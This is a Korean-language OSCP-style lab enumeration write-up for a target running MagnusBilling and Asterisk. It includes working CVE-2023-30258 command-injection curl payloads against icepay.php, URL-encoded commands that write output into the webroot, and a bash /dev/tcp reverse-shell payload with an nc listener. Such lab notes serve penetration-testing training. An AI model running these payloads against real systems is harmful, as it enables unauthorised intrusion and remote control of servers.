# OSCP 침투 테스트 이뉴머레이션 정리

## 🎯 타겟 시스템 정보
- **IP**: 10.10.141.15
- **OS**: Linux (Debian 기반)

## 📡 1단계: 초기 포트 스캔 및 서비스 발견

### Nmap 스캔 결과
```bash
nmap -Pn -sC -sV -oN scan.txt -p- 10.10.141.15
```

**발견된 서비스:**
| 포트 | 서비스 | 버전 | 상태 |
|------|--------|------|------|
| 22   | SSH    | OpenSSH 9.2p1 Debian | 열림 |
| 80   | HTTP   | Apache 2.4.62 | 열림 |
| 3306 | MySQL  | MariaDB | 열림 (인증 필요) |
| 5038 | Asterisk | Call Manager 2.10.6 | 열림 |

**핵심 발견사항:**
- `/mbilling/` 디렉토리가 robots.txt에서 발견됨
- HTTP 서비스가 자동으로 `/mbilling/`로 리다이렉트됨

## 🔍 2단계: 서비스별 이뉴머레이션

### A. HTTP 서비스 (포트 80) - MagnusBilling 발견
```bash
# 웹 서버 확인
curl -s http://10.10.141.15/mbilling/ | grep -i version
```

**발견된 애플리케이션**: MagnusBilling (VoIP 빌링 시스템)

### B. Asterisk Call Manager (포트 5038)
```bash
# Asterisk 서비스 연결 테스트
nc -nv 10.10.141.15 5038
```

**연결 결과:**
- Asterisk Call Manager/2.10.6 실행 중
- 기본 크리덴셜 시도: admin/admin → 인증 실패

**사용한 netcat 옵션:**
- `-n`: DNS 조회 비활성화 (속도 향상)
- `-v`: verbose 모드 (연결 상태 출력)

## 🔎 3단계: 취약점 조사

### Asterisk 취약점 검색
```bash
searchsploit Asterisk
```
**결과**: 다수의 DoS 취약점 발견되었으나 원격 코드 실행 취약점은 제한적

### MagnusBilling 취약점 검색
```bash
searchsploit magnus
```
**🚨 중요 발견**: CVE-2023-30258 - Command Injection 취약점
- **파일**: `/usr/share/exploitdb/exploits/multiple/webapps/52170.txt`
- **영향 버전**: MagnusBilling 7.3.0
- **취약점 유형**: 명령어 주입 (Command Injection)

## 💥 4단계: 발견된 취약점 분석

### CVE-2023-30258 상세 정보
**취약한 엔드포인트:**
```
/lib/icepay/icepay.php?democ=<payload>
```

**PoC (Proof of Concept):**
```bash
# 기본 명령어 주입 테스트
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=이게돼?"

# %3B는 세미콜론(;)의 URL 인코딩
# 세미콜론으로 명령어를 체인화하여 추가 명령 실행 가능
```

## 🚫 현재 직면한 문제들

1. **연결 문제**: 일부 curl/gobuster 명령에서 연결 거부 발생
   - 방화벽 또는 서비스 다운타임 가능성

2. **디렉토리 이뉴머레이션 실패**: gobuster 실행 중 연결 오류

## 🎯 다음 단계 액션 플랜

#### 1. 연결 상태 재확인
```bash
# 포트 상태 재확인
nmap -p 80,22,3306,5038 10.10.141.15
```

#### 2. 웹 서비스 접근성 테스트
```bash
# 웹 서버 응답 확인
curl -I http://10.10.141.15/
curl -I http://10.10.141.15/mbilling/

# robots.txt 내용 확인
curl http://10.10.141.15/robots.txt
```

#### 3. Command Injection 취약점 테스트
```bash
# 5초 지연되면 명령어가 실행된 것
time curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bsleep%205"
# 결과를 웹에서 접근 가능한 위치에 저장
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/result.txt"

# 저장된 결과 확인
curl "http://10.10.141.15/mbilling/result.txt"

# 1단계: 기본 명령어 실행 테스트
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami"

# 2단계: 시스템 정보 수집
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bid"
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Buname%20-a"

# 3단계: 파일 시스템 탐색
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bls%20-la"
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
```

#### 4. 리버스 쉘 시도
```bash
# 리스너 설정
nc -lvnp 4444
l: listen
v: verbose mode
n: numeric-only IP addresses
p: port number

# 리버스 쉘 시도
curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%27"
```

#### 5. 추가 이뉴머레이션
```bash
# 디렉토리 브루트포싱 재시도
gobuster dir -u http://10.10.141.15/mbilling/ -w /usr/share/wordlists/dirb/common.txt

# 설정 파일 접근 시도
curl http://10.10.141.15/mbilling/config/config.conf.php
curl http://10.10.141.15/mbilling/config/
```


#### MySQL 서비스 조사
```bash
# MySQL 연결 시도
mysql -h 10.10.141.15 -u root -p
mysql -h 10.10.141.15 -u admin -p
```

## 🎯 예상 성공 시나리오

1. **Command Injection 성공** → 웹쉘 또는 리버스 쉘 획득
2. **권한 상승** → Linux 권한 상승 기법 적용
3. **플래그 획득** → user.txt, root.txt 파일 발견

## ⚠️ 주의사항

- OSCP 시험에서는 **수동 도구만 사용** (sqlmap, metasploit 제한)
- **DoS 공격 금지** (Asterisk DoS 취약점 사용 불가)
- **brute force는 신중히** (계정 잠금 위험)

## 📚 필요한 추가 기술

1. **URL 인코딩** 이해 (특수문자 처리)
2. **리버스 쉘 페이로드** 구성
3. **Linux 권한 상승** 기법
4. **웹쉘 업로드** 기법